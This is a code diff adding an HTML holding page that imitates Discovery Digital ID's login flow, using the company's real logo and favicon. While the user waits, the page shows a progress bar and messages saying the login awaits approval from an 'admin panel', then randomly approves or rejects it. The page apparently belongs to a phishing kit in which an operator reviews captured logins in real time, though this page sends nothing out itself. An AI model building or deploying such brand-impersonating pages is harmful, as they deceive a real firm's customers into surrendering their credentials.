@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Discovery Digital ID - Processing</title>
+    <link rel="icon" type="image/x-icon" href="https://id.discovery.co.za/dui/current/icons/favicon/discovery/favicon-32x32.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <style>
+        @charset "UTF-8";
+        /*! Bootstrap v4.0.0-alpha.6 */
+        /*! Animate.css - http://daneden.me/animate */
+        /*!------------------------------------ #VISIBILITY HELPER ------------------------------------*/
+        /*!------------------------------------ #DISPLAY HELPER ------------------------------------*/
+        /*!------------------------------------ #POSITION HELPER ------------------------------------*/
+        /*!------------------------------------ #OVERFLOW HELPER ------------------------------------*/
+        /*!------------------------------------ #ALIGN HELPER ------------------------------------*/
+        /*!------------------------------------ #FLOAT HELPER ------------------------------------*/
+        
+        .show{display:block}
+        .hide{visibility:hidden}
+        .hidden{display:none}
+        
+        .inline{display:inline!important}
+        .inline-block{display:inline-block!important}
+        .block{display:block!important}
+        .table{display:table!important}
+        .table-cell{display:table-cell!important}
+        
+        .relative{position:relative!important}
+        .absolute{position:absolute}
+        .fixed{position:fixed}
+        .static{position:static}
+        
+        .pull-right{float:right}
+        
+        /*! CUSTOM STYLES */
+        body {
+            font-family: "Open Sans", sans-serif;
+            font-size: 1em;
+            line-height: 1.875;
+            background-color: #f8f9fa;
+            height: 100vh;
+            margin: 0;
+        }
+        
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        
+        .loading-logo {
+            width: 225px;
+            height: 45px;
+            background: url('https://id.discovery.co.za/dui/current/icons/discovery-logo/SVG/logo-color.svg') 0 0/225px 45px no-repeat;
+            margin-bottom: 40px;
+        }
+        
+        .spinner-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 30px;
+        }
+        
+        .spinner {
+            box-sizing: border-box;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 6px solid #eee;
+            border-top-color: #004b8d;
+            -webkit-animation: spinner 1s linear infinite;
+            animation: spinner 1s linear infinite;
+        }
+        
+        .spinner-text {
+            font-size: 1.2rem;
+            color: #6c757d;
+            margin-top: 20px;
+        }
+        
+        .progress-bar-container {
+            width: 300px;
+            height: 10px;
+            background-color: #e9ecef;
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: #004b8d;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        @-webkit-keyframes spinner {
+            to {-webkit-transform: rotate(360deg); transform: rotate(360deg);}
+        }
+        
+        @keyframes spinner {
+            to {-webkit-transform: rotate(360deg); transform: rotate(360deg);}
+        }
+        
+        .status-message {
+            font-size: 1rem;
+            color: #495057;
+            margin-top: 10px;
+            min-height: 1.5em;
+        }
+        
+        .result-message {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .success-message {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error-message {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .back-link {
+            margin-top: 30px;
+        }
+        
+        @media (max-width: 767px) {
+            .loading-logo {
+                width: 150px;
+                height: 30px;
+                background-size: 150px 30px;
+            }
+            
+            .spinner-container {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .spinner {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .progress-bar-container {
+                width: 250px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="loading-logo"></div>
+        <div class="spinner-container">
+            <div class="spinner" id="spinner"></div>
+        </div>
+        <h4 id="title">Processing Your Request</h4>
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status-message" id="statusMessage">Waiting for admin approval...</div>
+        <div class="result-message" id="resultMessage"></div>
+        <div class="back-link" id="backLink" style="display: none;">
+            <a href="/" class="btn btn-outline-primary">Back to Login</a>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Get parameters from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const username = urlParams.get('username') || 'user';
+            const status = urlParams.get('status') || '';
+            
+            // If status is already provided (approved), show success message
+            if (status === 'approved') {
+                showSuccessMessage();
+                return;
+            }
+            
+            // Simulate progress while waiting for admin approval
+            let progress = 0;
+            const progressBar = $('#progressBar');
+            const statusMessage = $('#statusMessage');
+            
+            const messages = [
+                "Waiting for admin approval...",
+                "Request sent to admin panel...",
+                "Awaiting administrator response...",
+                "Still waiting for approval..."
+            ];
+            
+            let messageIndex = 0;
+            
+            // Update status messages
+            const messageInterval = setInterval(() => {
+                statusMessage.text(messages[messageIndex]);
+                messageIndex = (messageIndex + 1) % messages.length;
+            }, 2000);
+            
+            // Simulate progress
+            const progressInterval = setInterval(() => {
+                progress += Math.floor(Math.random() * 5) + 1;
+                if (progress >= 100) {
+                    progress = 100;
+                }
+                progressBar.css('width', `${progress}%`);
+            }, 300);
+            
+            // Check for admin response every second
+            const checkResponse = setInterval(() => {
+                // In a real implementation, this would check for a response from the admin
+                // For this demo, we'll simulate a response after 15 seconds
+                if (progress >= 100) {
+                    clearInterval(checkResponse);
+                    clearInterval(progressInterval);
+                    clearInterval(messageInterval);
+                    
+                    // Simulate admin approval (50% chance of approval)
+                    const approved = Math.random() > 0.5;
+                    if (approved) {
+                        showSuccessMessage();
+                    } else {
+                        showErrorMessage();
+                    }
+                }
+            }, 1000);
+        });
+        
+        function showSuccessMessage() {
+            $('#spinner').hide();
+            $('#title').text('Login Approved');
+            $('#statusMessage').text('Your login request has been approved by the administrator.');
+            $('#progressBar').css('width', '100%').css('background-color', '#28a745');
+            $('#resultMessage').removeClass('error-message').addClass('success-message').text('Login successful! Redirecting...').show();
+            $('#backLink').show();
+            
+            // Redirect to success page after 3 seconds
+            setTimeout(() => {
+                // Store successful login in localStorage
+                const loginData = {
+                    username: new URLSearchParams(window.location.search).get('username') || 'user',
+                    timestamp: new Date().toISOString(),
+                    status: 'success',
+                    ip: '192.168.1.100'
+                };
+                
+                let storedData = JSON.parse(localStorage.getItem('loginData')) || [];
+                storedData.push(loginData);
+                localStorage.setItem('loginData', JSON.stringify(storedData));
+                
+                // Redirect to a success page or dashboard
+                window.location.href = '/'; // For now, redirect back to login
+            }, 3000);
+        }
+        
+        function showErrorMessage() {
+            $('#spinner').hide();
+            $('#title').text('Login Rejected');
+            $('#statusMessage').text('Your login request has been rejected by the administrator.');
+            $('#progressBar').css('width', '100%').css('background-color', '#dc3545');
+            $('#resultMessage').removeClass('success-message').addClass('error-message').text('Access denied. Please contact your administrator.').show();
+            $('#backLink').show();
+        }
+    </script>
+</body>
+</html>
